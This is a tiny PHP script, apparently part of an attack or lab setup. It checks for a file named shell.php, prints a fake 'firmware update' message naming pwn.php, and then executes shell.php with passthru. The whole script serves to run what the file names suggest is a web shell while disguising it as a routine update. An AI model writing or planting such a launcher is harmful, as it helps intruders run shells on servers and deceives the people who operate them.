<?php
if(md5_file("shell.php") == True){
    echo "Congratulations! Running firmware update: pwn.php <br>";
    passthru("php " . "shell.php");
}
?>